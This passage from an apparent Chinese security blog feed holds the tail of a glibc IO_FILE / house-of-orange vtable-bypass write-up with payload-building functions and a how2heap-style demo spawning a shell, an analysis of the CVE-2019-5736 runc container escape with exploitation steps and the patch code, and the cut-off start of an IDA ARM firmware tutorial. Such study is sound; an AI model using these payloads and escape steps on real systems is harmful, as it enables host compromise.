(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li><li>fp+0xe0指向system地址</li></ul><p>总结bypass如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_flags &#x3D; 0</span><br><span class="line">_IO_write_base &#x3D; 0</span><br><span class="line">_IO_write_ptr &#x3D; (binsh_in_libc_addr -100) &#x2F; 2 +1</span><br><span class="line">_IO_buf_end &#x3D; (binsh_in_libc_addr -100) &#x2F; 2 </span><br><span class="line"></span><br><span class="line">_freeres_list &#x3D; 0x2</span><br><span class="line">_freeres_buf &#x3D; 0x3</span><br><span class="line">_mode &#x3D; -1</span><br><span class="line"></span><br><span class="line">vtable &#x3D; _IO_str_jumps - 0x18</span><br></pre></td></tr></table></figure><p>关键paylaod 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def VtableCheckBypass(vtable_addr, system_addr, binsh_addr, io_list_all_addr):</span><br><span class="line">payload &#x3D; p64(0) + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)</span><br><span class="line">payload +&#x3D; p64(0) + p64((binsh_addr - 100) &#x2F; 2 + 1) + p64(0) + p64(0) + p64((binsh_addr - 100) &#x2F; 2) + p64(0) * 6 + p64(0) + p64(0) * 4</span><br><span class="line">payload +&#x3D; p64(0) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(vtable_addr - 0x18) + p64(system_addr)</span><br><span class="line">return payload</span><br></pre></td></tr></table></figure><h3 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -&gt; finish"></a>_IO_str_jumps -&gt; finish</h3><p>原理与上面的 _IO_str_jumps -&gt; overflow 类似</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件：</p><ol><li>_IO_buf_base不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + 0x10) &amp; ~1</span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line"></span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_finish - 0x18</span><br><span class="line">fp+0xe8 -&gt; system_addr</span><br></pre></td></tr></table></figure><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line">    <span class="comment">// unsorted bin attack</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// _IO_str_finish conditions</span></span><br><span class="line">    <span class="keyword">char</span> binsh_in_libc[] = <span class="string">&quot;/bin/sh\x00&quot;</span>; <span class="comment">// we can found &quot;/bin/sh&quot; in libc, here i create it in stack</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">0</span>] = ((<span class="keyword">size_t</span>) &amp;binsh_in_libc + <span class="number">0x10</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line">    top[<span class="number">7</span>] = ((<span class="keyword">size_t</span>)&amp;binsh_in_libc); <span class="comment">// buf_base</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// house_of_orange conditions</span></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line">    top[<span class="number">5</span>] = <span class="number">0x1</span> ; <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    top[<span class="number">20</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">18</span>];</span><br><span class="line">    top[<span class="number">21</span>] = <span class="number">2</span>;</span><br><span class="line">    top[<span class="number">22</span>] = <span class="number">3</span>;</span><br><span class="line">    top[<span class="number">24</span>] = <span class="number">-1</span>;</span><br><span class="line">    top[<span class="number">27</span>] = (<span class="keyword">size_t</span>) <span class="built_in">stdin</span> - <span class="number">0x33f0</span> - <span class="number">0x18</span>;</span><br><span class="line">    top[<span class="number">29</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">  top[<span class="number">30</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">30</span>];</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VtableCheckBypass_2</span>(<span class="params">vtable_addr,heap_addr,system_addr,binsh_addr,io_list_all_addr</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    _IO_str_finish conditions</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    houseoforange glibc.2.24 bypass vtablecheck</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    vtable_addr is _IO_str_finish addr (libc 2.24: 0x3BE050)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload += p64((binsh_addr+<span class="number">0x10</span>) &amp; ~<span class="number">1</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(io_list_all_addr<span class="number">-0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    payload += p64(vtable_addr<span class="number">-0x18</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(system_addr)</span><br><span class="line">    payload += p64(payload+<span class="number">0x660</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h2 id="0x04-缓冲区以及fileno的利用"><a href="#0x04-缓冲区以及fileno的利用" class="headerlink" title="0x04 缓冲区以及fileno的利用"></a>0x04 缓冲区以及<code>fileno</code>的利用</h2><p>在 0x03 提到了<code> _IO_FILE</code> 结构体上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE Pwn </tag>
            
            <tag> houseoforange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-5736 Docker逃逸</title>
      <link href="CVE-2019-5736-Docker-escape.html"/>
      <url>CVE-2019-5736-Docker-escape.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>前言： 最近公开了一个 Docker逃逸的漏洞，在35c3 ctf结束后，由 dragonsecto 发现。<a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host</a>就此自己稍微分析了一下原理。</p><h2 id="0x01-RunC"><a href="#0x01-RunC" class="headerlink" title="0x01 RunC"></a>0x01 RunC</h2><p>众所周知，RunC 是一个轻量级的工具，它是用来运行容器的，只用来做这一件事，并且这一件事要做好。我们可以认为它就是个命令行小工具，可以不用通过 docker 引擎，直接运行容器。事实上，runC 是标准化的产物，它根据 OCI 标准来创建和运行容器。而 OCI(Open Container Initiative)组织，旨在围绕容器格式和运行时制定一个开放的工业化标准。</p><p>换一句话说，其实 Docker 在管理容器的时候，其实底层就是跑的RunC</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@VM-118-78-ubuntu:~<span class="comment"># docker info | grep &quot;runc&quot;</span></span><br><span class="line">Runtimes: runc</span><br><span class="line">Default Runtime: runc</span><br><span class="line">runc version: N/A (expected: 54296cf40ad8143b62dbcaa1d90e520a2136ddfe)</span><br><span class="line">WARNING: No swap <span class="built_in">limit</span> support</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214231100.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214231100.png"></a></p><p>从图中就可以得知，runc 和docker 的命令执行效果其实是差不多的。</p><h2 id="0x02-PID-NameSpace"><a href="#0x02-PID-NameSpace" class="headerlink" title="0x02 PID NameSpace"></a>0x02 PID NameSpace</h2><p><strong>PID Namespace</strong>  隔离进程pid之后，ns中的进程无法发现外界的进程。而外部ns中进程可以发现ns中进程。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214231734.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214231734.png"></a></p><h2 id="0x03-漏洞利用点"><a href="#0x03-漏洞利用点" class="headerlink" title="0x03 漏洞利用点"></a>0x03 漏洞利用点</h2><p>另外一个值得注意的是 <strong>/proc/self/exe</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214232257.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214232257.png"></a></p><p>可以发现 <code>proc/pid/exc</code> 正常是会被指向所运行文件。而这个漏洞的漏洞利用点正在于此，如果使用此时用 <code>docker exec binfile</code> 。此时如果能在容器内，拿到 runc 的pid 从而获取 runc 的符号链接。</p><p>那么我们就能通过覆盖 runc 为恶意程序来达到 Docker 逃逸的目的。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><ol><li>容器内想办法获取 Runc PID。</li><li>得到 PID 后，获取文件描述符</li><li>对 fd 进行写操作，覆盖原有 runc</li></ol><ul><li>获取 RunC的PID，我们知道 容器内的PID 是通过namespace 特殊隔离的，通常而言，如果此时有进程 A ，进程 A 的PID为 233，那么下一步我们运行个进程 B，那么此时进程 B 的PID理应为 234</li><li>获取文件操作符</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;runc&#x27;</span> exe_name:</span><br><span class="line">    fp = open(<span class="string">&#x27;/proc/%d/exe&#x27;</span> % pid,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fd = fp.fileno()</span><br></pre></td></tr></table></figure><ul><li>然后就可以 通过打开 fd 的形式，对 runc 文件进行操作。</li></ul><p>演示效果如下：</p><p><strong>请全屏观看！！！</strong></p><script type="text/javascript" src="https://asciinema.org/a/XAYR7Ehuts10MXKnu3ttO8QAe.js" id="asciicast-XAYR7Ehuts10MXKnu3ttO8QAe" async></script><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p><a href="https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d">merge branch ‘cve-2019-5736’</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190215002152.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190215002152.png"></a></p><p>可以看到 添加了一个 ensure_cloned_binary 函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ensure_cloned_binary(void)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> execfd;</span><br><span class="line">char **argv = NULL, **envp = NULL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check that we&#x27;re not self-cloned, and if we are then bail. */</span></span><br><span class="line"><span class="keyword">int</span> cloned = is_self_cloned();</span><br><span class="line"><span class="keyword">if</span> (cloned &gt; <span class="number">0</span> || cloned == -ENOTRECOVERABLE)</span><br><span class="line"><span class="keyword">return</span> cloned;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fetchve(&amp;argv, &amp;envp) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">execfd = clone_binary();</span><br><span class="line"><span class="keyword">if</span> (execfd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">fexecve(execfd, argv, envp);</span><br><span class="line"><span class="keyword">return</span> -ENOEXEC;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断 exe 是否被clone </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">static <span class="keyword">int</span> is_self_cloned(void)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> fd, ret, is_cloned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY|O_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">ret = fcntl(fd, F_GET_SEALS);</span><br><span class="line">is_cloned = (ret == RUNC_MEMFD_SEALS);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="keyword">struct</span> stat statbuf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ret = fstat(fd, &amp;statbuf);</span><br><span class="line"><span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">is_cloned = (statbuf.st_nlink == <span class="number">0</span>);</span><br><span class="line">#endif</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="keyword">return</span> is_cloned;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果否，则执行 clone_binary 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">static <span class="keyword">int</span> clone_binary(void)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> binfd, memfd;</span><br><span class="line">ssize_t sent = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">memfd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">memfd = open(<span class="string">&quot;/tmp&quot;</span>, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, <span class="number">0711</span>);</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">if</span> (memfd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">binfd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY | O_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (binfd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">sent = sendfile(memfd, binfd, NULL, RUNC_SENDFILE_MAX);</span><br><span class="line"><span class="built_in">close</span>(binfd);</span><br><span class="line"><span class="keyword">if</span> (sent &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line"><span class="keyword">int</span> err = fcntl(memfd, F_ADD_SEALS, RUNC_MEMFD_SEALS);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">/* Need to re-open &quot;memfd&quot; as read-only to avoid execve(2) giving -EXTBUSY. */</span></span><br><span class="line"><span class="keyword">int</span> newfd;</span><br><span class="line">char *fdpath = NULL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (asprintf(&amp;fdpath, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, memfd) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">newfd = open(fdpath, O_RDONLY | O_CLOEXEC);</span><br><span class="line">free(fdpath);</span><br><span class="line"><span class="keyword">if</span> (newfd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(memfd);</span><br><span class="line">memfd = newfd;</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">return</span> memfd;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line"><span class="built_in">close</span>(memfd);</span><br><span class="line"><span class="keyword">return</span> -EIO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>return 一个新的 fd</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p><a href="https://www.openwall.com/lists/oss-security/2019/02/11/2">oss-security</a></p><p><a href="https://github.com/q3k/cve-2019-5736-poc">CVE-2019-36 PoC</a></p><p><a href="https://github.com/feexd/pocs/blob/master/CVE-2019-5736/exploit.c">CVE-2019-5736 docker image and exploit</a></p><p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2019-5736 </tag>
            
            <tag> Docker Escape </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use IDA reverse ARM （setup and find enryp-point）</title>
      <link href="use-ida-reverse-arm.html"/>
      <url>use-ida-reverse-arm.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>仅仅一点经验之谈</p><h2 id="0x01-get-u-binary"><a href="#0x01-get-u-binary" class="headerlink" title="0x01 get u binary"></a>0x01 get u binary</h2><ul><li><p>dump binary from flash</p></li><li><p>dump binary when update firmware</p><p>…</p></li></ul><h2 id="0x02-loader-to-ida"><a href="#0x02-loader-to-ida" class="headerlink" title="0x02 loader to ida"></a>0x02 loader to ida</h2><p>like this ，I have a bluetooth binary ..</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115210.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115210.png"></a></p><p>we got a firmware from some one smart door lock, in he firmware upgrade traffic.</p><p>When we use ida open it,we can see it .</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115607.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115607.png"></a></p><ul><li>Firstly ,we know it is arm</li><li>Secondlye ,we guess it is  arm little-endian</li></ul><p>So,we choice Processor type:</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115911.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115911.png"></a></p><p>than ,we press ok… we can 